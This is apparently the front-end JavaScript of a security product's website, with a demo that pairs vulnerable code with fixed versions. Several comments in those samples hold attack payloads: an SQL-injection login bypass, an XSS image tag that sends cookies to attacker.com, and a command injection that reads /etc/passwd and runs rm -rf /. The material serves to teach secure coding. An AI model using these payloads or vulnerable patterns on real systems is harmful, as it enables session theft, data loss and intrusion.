



// Global functions for direct inline click handlers
function toggleFAQ(btn) {
  const item = btn ? btn.closest('.faq-item') : null;
  if (item) {
    item.classList.toggle('open');
  }
}

function switchTour(tourName, btn) {
  document.querySelectorAll('.tour-tab-btn').forEach(b => b.classList.remove('active'));
  if (btn) btn.classList.add('active');
  document.querySelectorAll('.mockup-slide').forEach(s => s.style.display = 'none');
  const slide = document.getElementById('slide-' + tourName);
  if (slide) slide.style.display = 'block';
}

function switchPlayground(key, btn) {
  document.querySelectorAll('.vuln-tab').forEach(b => b.classList.remove('active'));
  if (btn) btn.classList.add('active');
  if (typeof updatePlayground === 'function') {
    updatePlayground(key);
  }
}

/**
 * Shipcheck Presentation Deck & Product Website Logic
 * 100% Client-Side — Zero Backend Needed
 */

const PLAYGROUND_DATA = {
  sqli: {
    title: "Blind & Classic SQL Injection",
    cwe: "CWE-89: SQL Injection",
    scoreBefore: "42 / 100",
    scoreAfter: "95 / 100",
    delta: "+53 Security Score",
    explanation: "User input is directly concatenated into SQL strings, allowing attackers to bypass authentication, dump database tables, or execute arbitrary commands.",
    beforeCode: `// ❌ VULNERABLE: Direct f-string string concatenation
@app.post("/api/login")
def login(username: str, password: str, db: sqlite3.Connection):
    # Attacker payload: ' OR '1'='1' --
    query = f"SELECT id, role FROM users WHERE username = '{username}' AND password = '{password}'"
    cursor = db.execute(query)
    user = cursor.fetchone()
    return {"status": "ok", "user": user}`,
    afterCode: `// ✅ SHIPCHECK AI FIX: Parameterized SQL & Hash Verification
@app.post("/api/login")
def login(credentials: LoginRequest, db: sqlite3.Connection):
    cursor = db.execute(
        "SELECT id, password_hash, role FROM users WHERE username = ?",
        (credentials.username,)
    )
    user = cursor.fetchone()
    if not user or not bcrypt.checkpw(credentials.password.encode(), user["password_hash"].encode()):
        raise HTTPException(status_code=401, detail="Invalid credentials")
    return {"status": "ok", "role": user["role"]}`
  },
  secrets: {
    title: "Hardcoded Database & JWT Secrets",
    cwe: "CWE-798: Use of Hard-coded Credentials",
    scoreBefore: "55 / 100",
    scoreAfter: "98 / 100",
    delta: "+43 Security Score",
    explanation: "Hardcoded production master secrets, database passwords, and API tokens in the source code allow anyone with read access to compromise the environment.",
    beforeCode: `// ❌ VULNERABLE: Hardcoded credential constants
DATABASE_URI = "postgresql://admin:P@ssw0rd2026_ShipCheck!@prod-db.internal:5432/core"
JWT_SECRET_KEY = "super_secret_master_token_do_not_share"

def get_auth_token(user_id: str):
    return jwt.encode({"sub": user_id}, JWT_SECRET_KEY, algorithm="HS256")`,
    afterCode: `// ✅ SHIPCHECK AI FIX: Environment Variables & Secret Vault
import os
from pydantic_settings import BaseSettings

class Settings(BaseSettings):
    DATABASE_URI: str = os.environ["DATABASE_URI"]
    JWT_SECRET_KEY: str = os.environ["JWT_SECRET_KEY"]

settings = Settings()

def get_auth_token(user_id: str):
    return jwt.encode({"sub": user_id}, settings.JWT_SECRET_KEY, algorithm="HS256")`
  },
  xss: {
    title: "Stored & Reflected Cross-Site Scripting (XSS)",
    cwe: "CWE-79: Improper Neutralization of Input During Web Page Generation",
    scoreBefore: "48 / 100",
    scoreAfter: "94 / 100",
    delta: "+46 Security Score",
    explanation: "Raw unescaped user input rendered directly into the HTML DOM permits session hijacking, malicious credential harvesting, and arbitrary JavaScript execution.",
    beforeCode: `// ❌ VULNERABLE: Direct innerHTML injection
function renderUserProfile(user) {
    const banner = document.getElementById("profile-header");
    // Attacker payload: <img src=x onerror="fetch('http://attacker.com/steal?c=' + document.cookie)">
    banner.innerHTML = "<h1>Welcome, " + user.name + "</h1><p>" + user.bio + "</p>";
}`,
    afterCode: `// ✅ SHIPCHECK AI FIX: DOM textContent & Sanitization
function renderUserProfile(user) {
    const banner = document.getElementById("profile-header");
    banner.replaceChildren();

    const h1 = document.createElement("h1");
    h1.textContent = "Welcome, " + user.name;

    const p = document.createElement("p");
    p.textContent = user.bio; // Safely escaped automatically

    banner.append(h1, p);
}`
  },
  rce: {
    title: "Remote Code Execution (Command Injection)",
    cwe: "CWE-78: Improper Neutralization of Special Elements used in an OS Command",
    scoreBefore: "30 / 100",
    scoreAfter: "99 / 100",
    delta: "+69 Security Score",
    explanation: "Executing arbitrary shell strings with user-controlled parameters lets remote attackers execute arbitrary commands, read filesystem files, and compromise the server.",
    beforeCode: `// ❌ VULNERABLE: os.popen with unvalidated input
import os

@app.get("/api/diagnostics/ping")
def run_ping(target_host: str):
    # Payload: 127.0.0.1; cat /etc/passwd; rm -rf /
    output = os.popen(f"ping -c 1 {target_host}").read()
    return {"diagnostic": output}`,
    afterCode: `// ✅ SHIPCHECK AI FIX: Strict Input Validation & Subprocess Array
import ipaddress
import subprocess

@app.get("/api/diagnostics/ping")
def run_ping(target_host: str):
    ipaddress.ip_address(target_host)
    res = subprocess.run(["ping", "-c", "1", target_host], capture_output=True, text=True, check=True)
    return {"diagnostic": res.stdout}`
  }
};

document.addEventListener('DOMContentLoaded', () => {
  detectUserOS();
  initCopyButtons();
  initTourTabs();
  initPlayground();
  initFAQ();
  animateTelemetryStats();
});

/**
 * Switch interactive product tour screenshots / slides
 */
function initTourTabs() {
  const tabs = document.querySelectorAll('.tour-tab-btn');
  const slides = document.querySelectorAll('.mockup-slide');

  tabs.forEach(tab => {
    tab.addEventListener('click', () => {
      const target = tab.getAttribute('data-tour');

      tabs.forEach(t => t.classList.remove('active'));
      tab.classList.add('active');

      slides.forEach(slide => {
        if (slide.id === `slide-${target}`) {
          slide.style.display = 'block';
        } else {
          slide.style.display = 'none';
        }
      });
    });
  });
}

/**
 * Auto-detect client OS and highlight the relevant download card
 */
function detectUserOS() {
  const ua = window.navigator.userAgent.toLowerCase();
  const winCard = document.getElementById('dl-card-windows');
  const linuxCard = document.getElementById('dl-card-linux');

  if (!winCard || !linuxCard) return;

  if (ua.includes('linux')) {
    linuxCard.classList.add('highlight');
    winCard.classList.remove('highlight');
    const badge = linuxCard.querySelector('.dl-badge');
    if (badge) badge.textContent = 'Detected for your OS';
  } else {
    winCard.classList.add('highlight');
    linuxCard.classList.remove('highlight');
    const badge = winCard.querySelector('.dl-badge');
    if (badge) badge.textContent = 'Detected for your OS';
  }
}

/**
 * Handle copy to clipboard
 */
function initCopyButtons() {
  document.querySelectorAll('.copy-trigger').forEach(btn => {
    btn.addEventListener('click', async () => {
      const targetId = btn.getAttribute('data-target');
      const targetEl = document.getElementById(targetId);
      if (!targetEl) return;

      const text = targetEl.getAttribute('data-copy') || targetEl.textContent.trim();
      try {
        await navigator.clipboard.writeText(text);
        const originalIcon = btn.innerHTML;
        btn.innerHTML = `<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg>`;
        setTimeout(() => {
          btn.innerHTML = originalIcon;
        }, 2000);
      } catch (err) {
        console.error('Failed to copy text: ', err);
      }
    });
  });
}

/**
 * Interactive Code Diff Playground
 */
function initPlayground() {
  const tabs = document.querySelectorAll('.vuln-tab');
  const beforeCodeEl = document.getElementById('code-before-view');
  const afterCodeEl = document.getElementById('code-after-view');
  const explanationEl = document.getElementById('vuln-explanation-text');
  const scoreDeltaEl = document.getElementById('vuln-score-delta');
  const cweBadgeEl = document.getElementById('vuln-cwe-badge');

  function updatePlayground(key) {
    const data = PLAYGROUND_DATA[key];
    if (!data) return;

    if (beforeCodeEl) beforeCodeEl.textContent = data.beforeCode;
    if (afterCodeEl) afterCodeEl.textContent = data.afterCode;
    if (explanationEl) explanationEl.textContent = data.explanation;
    if (scoreDeltaEl) scoreDeltaEl.textContent = data.delta;
    if (cweBadgeEl) cweBadgeEl.textContent = data.cwe;
  }

  tabs.forEach(tab => {
    tab.addEventListener('click', () => {
      tabs.forEach(t => t.classList.remove('active'));
      tab.classList.add('active');
      const key = tab.getAttribute('data-vuln');
      updatePlayground(key);
    });
  });

  updatePlayground('sqli');
}

/**
 * FAQ Accordion toggle
 */
function initFAQ() {
  document.querySelectorAll('.faq-question').forEach(btn => {
    btn.addEventListener('click', () => {
      const item = btn.closest('.faq-item');
      if (item) {
        item.classList.toggle('open');
      }
    });
  });
}

/**
 * Subtle number tick animation for metrics
 */
function animateTelemetryStats() {
  const zeroDayEl = document.getElementById('stat-zeroday');
  if (!zeroDayEl) return;

  let count = 0;
  const target = 100;
  const timer = setInterval(() => {
    count += 2;
    if (count >= target) {
      count = target;
      clearInterval(timer);
    }
    zeroDayEl.textContent = `${count}%`;
  }, 20);
}
